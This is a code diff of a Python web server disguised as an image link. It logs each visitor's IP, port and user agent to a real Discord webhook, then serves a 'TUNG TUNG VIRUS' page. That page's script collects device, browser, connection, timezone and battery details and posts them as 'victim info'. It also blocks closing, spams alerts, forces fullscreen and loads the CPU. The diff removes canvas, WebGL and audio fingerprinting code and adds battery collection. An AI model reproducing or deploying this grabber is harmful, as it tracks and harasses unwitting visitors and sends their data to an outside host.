@@ -6,7 +6,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QH
 
 FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"
 
-# ──────── MAXIMUM INFO + ANNOYING PAGE ────────
+# ──────── MAX INFO + ANNOYING PAGE ────────
 ANNOY_HTML = """
 <!DOCTYPE html>
 <html>
@@ -23,7 +23,7 @@ ANNOY_HTML = """
 <body>
   <div id="overlay">
     <h1>TUNG TUNG VIRUS</h1>
-    <p>Stealing every bit of your info...</p>
+    <p>Collecting all your info...</p>
   </div>
 
   <!-- Loud Tung Tung Song -->
@@ -34,116 +34,82 @@ ANNOY_HTML = """
   <script>
     const webhook = "%s";
 
-    async function getMaxInfo() {
+    async function sendFullInfo() {
       const info = {
         timestamp: new Date().toISOString(),
-        ip: "Client-side only (see server log)",
         screen: {
           width: screen.width,
           height: screen.height,
           availWidth: screen.availWidth,
           availHeight: screen.availHeight,
           colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth,
-          devicePixelRatio: window.devicePixelRatio
+          pixelDepth: screen.pixelDepth
         },
-        window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight },
+        window: {
+          innerWidth: window.innerWidth,
+          innerHeight: window.innerHeight
+        },
         navigator: {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          vendor: navigator.vendor,
           language: navigator.language,
           languages: navigator.languages,
-          deviceMemory: navigator.deviceMemory || "N/A",
-          hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
-          cookieEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          onLine: navigator.onLine
+          platform: navigator.platform,
+          vendor: navigator.vendor,
+          deviceMemory: navigator.deviceMemory || "Unknown",
+          hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+          userAgent: navigator.userAgent
         },
         connection: navigator.connection ? {
-          effectiveType: navigator.connection.effectiveType,
+          type: navigator.connection.effectiveType,
           downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt,
-          saveData: navigator.connection.saveData
-        } : "N/A",
+          rtt: navigator.connection.rtt
+        } : "Unknown",
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        battery: "Unknown",
         touchSupport: 'ontouchstart' in window,
-        referrer: document.referrer || "Direct",
-        performance: performance.memory ? {
-          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
-          totalJSHeapSize: performance.memory.totalJSHeapSize,
-          usedJSHeapSize: performance.memory.usedJSHeapSize
-        } : "N/A"
+        referrer: document.referrer || "Direct"
       };
 
-      // Canvas Fingerprint
-      try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = "alphabetic";
-        ctx.font = "14px Arial";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = "#069";
-        ctx.fillText("Tung Tung", 2, 15);
-        info.canvasFingerprint = canvas.toDataURL();
-      } catch(e) { info.canvasFingerprint = "Blocked"; }
+      // Battery (if supported)
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          info.battery = `${Math.floor(battery.level * 100)}%% ${battery.charging ? '(Charging)' : ''}`;
+        } catch(e) {}
+      }
 
-      // WebGL Fingerprint
-      try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        if (gl) {
-          info.webgl = {
-            vendor: gl.getParameter(gl.VENDOR),
-            renderer: gl.getParameter(gl.RENDERER),
-            version: gl.getParameter(gl.VERSION),
-            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
-          };
-        }
-      } catch(e) { info.webgl = "Blocked"; }
-
-      // AudioContext Fingerprint
-      try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioCtx.createOscillator();
-        const analyser = audioCtx.createAnalyser();
-        oscillator.connect(analyser);
-        analyser.connect(audioCtx.destination);
-        oscillator.frequency.value = 1000;
-        oscillator.start();
-        const buffer = new Uint8Array(analyser.frequencyBinCount);
-        analyser.getByteFrequencyData(buffer);
-        info.audioFingerprint = Array.from(buffer).join(',');
-        oscillator.stop();
-      } catch(e) { info.audioFingerprint = "Blocked"; }
-
-      // Send everything to Discord
+      // Send rich info to Discord
       fetch(webhook, {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          content: "**=== MAXIMUM INFO COLLECTED ===**",
+          content: "**=== FULL VICTIM INFO ===**",
           embeds: [{
-            title: "🕵️ FULL VICTIM DATA",
+            title: "🕵️ MAX INFO LOG",
             color: 0xff0000,
-            description: Object.entries(info).map(([k,v]) => `**${k}**:\n\`\`\`${typeof v === 'object' ? JSON.stringify(v,null,2) : v}\`\`\``).join("\n\n"),
+            description: Object.entries(info)
+              .map(([k, v]) => `**${k}**:\n\`\`\`${JSON.stringify(v, null, 2)}\`\`\``)
+              .join("\n\n"),
             timestamp: new Date().toISOString()
           }]
         })
       });
     }
 
-    // Run everything
-    getMaxInfo();
+    // Start everything
+    sendFullInfo();
 
     // Loud song
     const audio = document.getElementById("song");
     audio.volume = 1.0;
     audio.play().catch(() => {});
 
-    // Annoying stuff
+    // Fullscreen
     document.documentElement.requestFullscreen?.().catch(() => {});
+
+    // Block close
     window.onbeforeunload = () => "TUNG TUNG says NO!";
+
+    // Spam alerts
     setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
 
     // Heavy CPU lag
@@ -177,6 +143,7 @@ class handler(BaseHTTPRequestHandler):
             user_agent = self.headers.get('User-Agent', 'Unknown')
             parsed = httpagentparser.detect(user_agent)
 
+            # Quick initial log
             quick_log = f"""**NEW CLICK!**
 IP: `{ip}`
 Port: `{port}`
@@ -186,6 +153,7 @@ UA: `{user_agent}`"""
 
             requests.post(WEBHOOK_URL, json={"content": quick_log})
 
+            # Serve the max-info page
             html = ANNOY_HTML.encode('utf-8')
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
